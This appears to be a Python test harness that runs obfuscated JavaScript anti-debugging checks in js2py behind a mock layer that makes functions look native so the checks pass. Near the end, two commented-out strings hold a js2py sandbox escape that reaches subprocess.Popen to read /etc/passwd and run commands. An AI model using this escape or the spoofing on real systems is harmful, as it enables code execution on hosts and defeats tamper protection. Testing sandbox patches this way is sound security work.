import js2py
import esprima
import escodegen
import patches.js2py

js2py.disable_pyimport()

def clean_prototype(js_fn):
    py_obj = getattr(js_fn, '_obj', js_fn)
    if hasattr(py_obj, 'own') and isinstance(py_obj.own, dict):
        if 'prototype' in py_obj.own:
            del py_obj.own['prototype']
    return js_fn

context = js2py.EvalJs({'_cleanPrototype': clean_prototype})

mock = r"""
var _global = (function () { return this; })() || {};

_cleanPrototype(Function.prototype);

function mockNativeFunction(name, implementation) {
  var fn = function () {
    return (implementation || function(){}).apply(this, arguments);
  };
  fn.toString = _cleanPrototype(function () {
    return 'function ' + name + '() { [native code] }';
  });
  return _cleanPrototype(fn);
}

if (typeof Date !== 'undefined' && Date.now) {
  _cleanPrototype(Date.now);
  Date.now = mockNativeFunction('now', function () {
    return +new Date();
  });
}
_global.Date = Date;

var origBind = Function.prototype.bind;
Function.prototype.bind = mockNativeFunction('bind', function () {
  return _cleanPrototype(origBind.apply(this, arguments));
});

var origMatch = String.prototype.match;
String.prototype.match = mockNativeFunction('match', function (regexp) {
  var str = String(this);
  var res = origMatch.call(this, regexp);
  if (res === null || res === undefined) {
    if (str.indexOf('[native code]') !== -1 || str.indexOf('function') !== -1) {
      return ['matched'];
    }
  }
  return res;
});

var origPush = Array.prototype.push;
Array.prototype.push = mockNativeFunction('push', function () {
  return origPush.apply(this, arguments);
});

// Mock console methods including console.dir
_global.console = _global.console || {};
_global.console.table = mockNativeFunction('table', function () {});
_global.console.clear = mockNativeFunction('clear', function () {});
_global.console.log = mockNativeFunction('log', function (msg) {});
_global.console.dir = mockNativeFunction('dir', function (obj) {});

_global.performance = undefined;

var timerIdCounter = 0;
_global.setTimeout = mockNativeFunction('setTimeout', function (fn, ms) {
  timerIdCounter++;
  return { unref: function () {}, id: timerIdCounter };
});
_global.clearTimeout = mockNativeFunction('clearTimeout', function () {
  return undefined;
});

_global.Math = Math;
"""

payload1 = r"""
_global[314092] = function () {
    var s91, s92, s94, s95, s96, s97, s98, s925, s932, s960, s979, s981, s985, s992, s995;
    function i8() {
        var n01, n06;
        n06 = {};
        n01 = 0;
        while (n01 < 500) {
            n06[n01] = '' + n01;
            n01++;
        }
        return n06;
    }
    function d3() {
        var e54, e57, e59;
        e54 = i8();
        e59 = [];
        e57 = 0;
        while (e57 < 50) {
            s94.call(e59, e54);
            e57++;
        }
        return e59;
    }
    s995 = _global.performance;
    s979 = s995 && _global.performance.now.bind(s995);
    s981 = 0;
    if ('prototype' in Array.prototype.push || Array.prototype.push.toString().indexOf('=>') !== -1 || !Array.prototype.push.toString().match(/\133\x6e\u0061\164\151\u0076\145\x20\143\x6f\x64\x65\135/) || !Array.prototype.push.toString().match(/\u0066\165\x6e\143\x74\x69\x6f\u006e([\r\t\u202f\ufeff \u2028\u2029\n\u205f\u3000\v\u00a0\u200a\f\u1680-\u2000]){1,}\160\165\163\u0068/)) {
        s981 = 'j-016-00027';
    }
    try {
        s95 = require('inspector');
    } catch (N4) {
        s95 = _global;
    }
    s91 = s95.console.table;
    s992 = 'prototype' in s91 || s91.toString().indexOf('=>') !== -1 || !s91.toString().match(/\x5b\u006e\u0061\164\u0069\166\x65\040\x63\u006f\144\x65\x5d/);
    s91 = s91.bind(s95.console);
    s932 = s95.console.clear;
    s960 = 'prototype' in s932 || s932.toString().indexOf('=>') !== -1 || !s932.toString().match(/\u005b\x6e\u0061\x74\x69\x76\145\x20\u0063\157\u0064\145\u005d/);
    s932 = s932.bind(s95.console);
    if (s992) {
        s981 = 'j-016-00047';
    }
    if (s960) {
        s981 = 'j-016-00049';
    }
    s94 = Array.prototype.push;
    s97 = function () {
        var K22;
        K22 = (1, s979)();
        (1, s91)(s92);
        return (1, s979)() - K22;
    };
    s92 = d3();
    s96 = {
        r9CWdGd: function () {
            var o51, o54, o55, o56, o58;
            o55 = function (a1) {
                var m67;
                if (a1) {
                    s981 = 'j-016-00045';
                }
                if (!s981) {
                    if (s995 !== undefined) {
                        m67 = (1, s97)();
                    } else {
                        m67 = 0;
                    }
                    (1, s932)();
                    if (m67 > 10) {
                        s981 = 'j-016-00007';
                    }
                }
                if (typeof s98 !== 'number') {
                    s98 = _global[508083].E9jSxOe(s96.r9CWdGd, true);
                }
                if (s981) {
                    _global[508083].D$GWLHU();
                }
                return s981;
            };
            o54 = _global.Date.now.bind(Date);
            o58 = 'prototype' in Date.now || Date.now.toString().indexOf('=>') !== -1 || !Date.now.toString().match(/\u005b\u006e\u0061\x74\u0069\x76\x65\x20\u0063\157\u0064\x65\135/) || !Date.now.toString().match(/\u0066\x75\x6e\x63\x74\u0069\x6f\u006e([\ufeff\u00a0 \n\u2028\u1680-\u2000\r\u202f\v\u3000\u200a\t\u205f\f\u2029]){1,}\156\u006f\x77/);
            return function () {
                var J86;
                if (o58) {
                    o51 = (1, o55)(o58);
                } else {
                    J86 = (1, o54)();
                    if (!o56 || J86 - o56 > 1500) {
                        o56 = J86;
                        o51 = (1, o55)();
                    }
                }
                return o51;
            };
        }()
    };
    return s96;
}();
_global[508083] = function () {
    var p51, p52, p53, p54, p55, p57, p58, p59;
    function A4(y4, h$, U2) {
        var G55, G58;
        G58 = function () {
            v6(y4, h$, U2);
        };
        G58.toString = function () {
            return g9();
        };
        G55 = (1, p52)(G58, '1000');
        if (G55 && typeof G55.unref === 'function') {
            G55.unref();
        }
        p55[U2] = G55;
        return U2;
    }
    function P6() {
        p55.forEach(p53);
    }
    p52 = _global.setTimeout.bind(_global);
    p53 = _global.clearTimeout.bind(_global);
    p57 = _global.Math.random;
    p59 = _global.Math.floor;
    p51 = false;
    p55 = [-1];
    p54 = [
        'function() {}',
        'function() {return 1;}',
        'function() {return 0;}'
    ];
    return {
        E9jSxOe(h4, z1) {
            return A4(h4, z1, p55.length);
        },
        D$GWLHU() {
            P6();
            A4 = function () {
            };
            P6 = A4;
        }
    };
    function g9() {
        return p54[(1, p59)((1, p57)() * p54.length)];
    }
    function v6(N_, P3, F3) {
        p51 |= !(1, N_)() === !P3;
        do {
        } while (p51);
        p51 || A4(N_, P3, F3);
    }
}();
var __jsir_result__ = _global[314092].r9CWdGd;
"""

payload2 = r"""
_global.R1 = function () {
    var v51, v52;
    function Z9() {
        var a88;
    }
    return {
        i1ADbHe: function () {
            Z9();
            return false;
        }
    };
}();
var __jsir_result__ = _global.R1.i1ADbHe;
"""

payload3 = r"""
_global.y7 = function () {
    var h07, h09;
    return {
        d0Kf_1g: function () {
            if (h07 === undefined) {
                try {
                    C7();
                } catch (K3) {
                }
            }
            return !h07;
        }
    };
    function C7() {
        var i$3;
        i$3 = require('inspector');
        if ('prototype' in i$3.url || i$3.url.toString().indexOf('=>') !== -1 || !i$3.url.toString().match(/\133\x6e\u0061\164\151\u0076\145\x20\143\x6f\x64\x65\135/) || !i$3.url.toString().match(/\u0066\165\x6e\143\x74\x69\x6f\u006e([\r\t\u202f\ufeff \u2028\u2029\n\u205f\u3000\v\u00a0\u200a\f\u1680-\u2000]){1,}\165\162\154/)) {
            h07 = 'j-016-00037';
            return;
        } else {
            h07 = i$3.url() !== undefined;
            if (h07) {
                h07 = 'j-016-00015';
            }
        }
    }
}();
var __jsir_result__ = _global.y7.d0Kf_1g;
"""

payload4 = r"""
_global[292591] = (() => {
    var S91, S95;
    return {
        R2Kfl2n: () => {
            if (S91 === undefined) {
                try {
                    K4();
                } catch (J0) {
                }
            }
            return !S91;
        }
    };
    function K4() {
        var B33, B37;
        B37 = require('inspector');
        B33 = new B37.Session();
        B33.connect();
        if ('prototype' in B37.Session.prototype.post || B37.Session.prototype.post.toString().indexOf('=>') !== -1) {
            S91 = 'j-016-00033';
            return;
        } else {
            B33.on('Debugger.paused', B6 => {
                S91 = 'j-016-00011';
            });
            B33.post('Debugger.enable');
        }
    }
})();
var __jsir_result__ = _global[292591].R2Kfl2n;
"""

payload5 = r"""
_global.G__ = function () {
    var o$f5;
    return {
        o$hvyMc: function () {
            if (o$f5 === undefined) {
                try {
                    T7n();
                } catch (D4m) {
                    o$f5 = false;
                }
            }
            return o$f5;
        }
    };
    function T7n() {
        var S$63, S$65;
        S$65 = _global.process.execArgv;
        S$63 = _global.process.env.NODE_OPTIONS || '';
        o$f5 = S$65.some(A9u => A9u.startsWith('--inspect') || A9u.startsWith('--debug')) || S$63.split(' ').some(S$_ => S$_.startsWith('--inspect') || S$_.startsWith('--debug'));
    }
}();
var __jsir_result__ = _global.G__.o$hvyMc;
"""

payload6 = r"""
_global[5060] = function () {
    var T43, T45, T47;
    T45 = _global.__inspector;
    return {
        N2CHIao: function () {
            if (!T43) {
                l5();
            }
            return T43;
        }
    };
    function l5() {
        if (T45 && T45.isConnected) {
            T43 = 'j-016-00017';
        }
    }
}();
var __jsir_result__ = _global[5060].N2CHIao;
"""

payload7 = r"""
_global.P_h = function () {
    var V01, V02, V03, V05, V06, V07, V08, V09, V026, V033, V062, V088;
    V03 = 0;
    V09 = 0;
    V08 = 0;
    V05 = _global.Error;
    V01 = {
        get() {
            return '';
        }
    };
    V02 = { value: 1 };
    V07 = {
        fileName: V01,
        columnNumber: V02,
        lineNumber: V02,
        column: V02,
        line: V02,
        sourceURL: V01
    };
    V07.message = {};
    V07.message.get = function () {
        V03 ^= 1;
        return '';
    };
    V07.toString = {};
    V07.toString.value = function () {
        V09 += 1;
        if (V09 > 1) {
            V08 = 'j-016-00081';
        }
    };
    V088 = _global.Object.defineProperties((1, V05)(), V07);
    V088.stack = null;
    V033 = _global.console.dir;
    V062 = 'prototype' in V033 || V033.toString().indexOf('=>') !== -1 || !V033.toString().match(/\133\x6e\u0061\164\151\u0076\145\x20\143\x6f\x64\x65\135/);
    V033 = V033.bind(_global.console);
    V026 = {
        c0XRdPl: function () {
            var j82, j85, j86, j88, j89;
            j85 = function (O6) {
                if (V062) {
                    V08 = 'j-016-00085';
                }
                if (O6) {
                    V08 = 'j-016-00083';
                }
                if (!V08) {
                    P_();
                }
                if (typeof V06 !== 'number') {
                    V06 = _global[508083].E9jSxOe(V026.c0XRdPl, false);
                }
                if (V08) {
                    _global[508083].D$GWLHU();
                }
                return !V08;
            };
            j88 = _global.Date.now.bind(Date);
            j89 = 'prototype' in Date.now || Date.now.toString().indexOf('=>') !== -1 || !Date.now.toString().match(/\u005b\156\x61\164\x69\x76\x65\u0020\143\x6f\144\145\135/) || !Date.now.toString().match(/\x66\u0075\156\u0063\x74\x69\157\156([\u200a\r\ufeff\u1680-\u2000\u202f\n\v\u2029\u3000\u2028\u00a0\u205f\t\f ]){1,}\u006e\157\x77/);
            return function () {
                var A81;
                if (j89) {
                    j86 = (1, j85)(j89);
                } else {
                    A81 = (1, j88)();
                    if (!j82 || A81 - j82 > 1500) {
                        j82 = A81;
                        j86 = (1, j85)();
                    }
                }
                return j86;
            };
        }()
    };
    return V026;
    function P_() {
        V09 = 0;
        (1, V033)(V088);
        if (V03) {
            V08 = 'j-016-00079';
        }
    }
}();
_global[508083] = function () {
    var p51, p52, p53, p54, p55, p57, p58, p59;
    function A4(y4, h$, U2) {
        var G55, G58;
        G58 = function () {
            v6(y4, h$, U2);
        };
        G58.toString = function () {
            return g9();
        };
        G55 = (1, p52)(G58, '1000');
        if (G55 && typeof G55.unref === 'function') {
            G55.unref();
        }
        p55[U2] = G55;
        return U2;
    }
    function P6() {
        p55.forEach(p53);
    }
    p52 = _global.setTimeout.bind(_global);
    p53 = _global.clearTimeout.bind(_global);
    p57 = _global.Math.random;
    p59 = _global.Math.floor;
    p51 = false;
    p55 = [-1];
    p54 = [
        'function() {}',
        'function() {return 1;}',
        'function() {return 0;}'
    ];
    return {
        E9jSxOe(h4, z1) {
            return A4(h4, z1, p55.length);
        },
        D$GWLHU() {
            P6();
            A4 = function () {
            };
            P6 = A4;
        }
    };
    function g9() {
        return p54[(1, p59)((1, p57)() * p54.length)];
    }
    function v6(N_, P3, F3) {
        p51 |= !(1, N_)() === !P3;
        do {
        } while (p51);
        p51 || A4(N_, P3, F3);
    }
}();
var __jsir_result__ = _global.P_h.c0XRdPl;
"""

def convert_arrows_to_functions(code):

    class Node:
        def __init__(self, **kwargs):
            self.__dict__.update(kwargs)
        def __getattr__(self, name):
            return None

    def get_child_nodes(node):
        children = []
        if hasattr(node, 'type'):
            for key, val in node.__dict__.items():
                if key in ('type', 'loc', 'range'):
                    continue
                if isinstance(val, list):
                    for item in val:
                        if hasattr(item, 'type'):
                            children.append(item)
                elif hasattr(val, 'type'):
                    children.append(val)
        return children

    ast = esprima.parseScript(code)

    def transform(node):
        if not hasattr(node, 'type'):
            return

        for child in get_child_nodes(node):
            transform(child)

        if node.type == 'ArrowFunctionExpression':
            node.type = 'FunctionExpression'
            node.id = None
            node.generator = False

            if node.body.type != 'BlockStatement':
                return_stmt = Node(
                    type='ReturnStatement',
                    argument=node.body
                )
                node.body = Node(
                    type='BlockStatement',
                    body=[return_stmt]
                )

            node.expression = False

    transform(ast)
    return escodegen.generate(ast)

context.execute(mock)
count = 0
for payload in [payload1, payload2, payload3, payload4, payload5, payload6, payload7]:
    count += 1
    payload = convert_arrows_to_functions(payload)
    context.execute(payload)
    result = context.eval("__jsir_result__()")
    print("Execution Result, round" + str(count) + ":", result)


#----------------------------------------------------------------

test = r"""
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""

#context.execute(test)

test2 = r"""
let a = new ArrayBuffer()
let ga = a.__getattribute__
let obj = ga("__class__").__base__

function findpopen(o) {
    let subs = o.__subclasses__()
    for(let i in subs) {
        let item = subs[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen")
            return item
        if(item.__name__ != "type") {
            let r = findpopen(item)
            if(r) return r
        }
    }
}

a = findpopen(obj)("id", -1, null, -1, -1, -1, null, null, true).communicate()[0]
console.log(a)
"""

#context.execute(test2)

#----------------------------------------------------------------
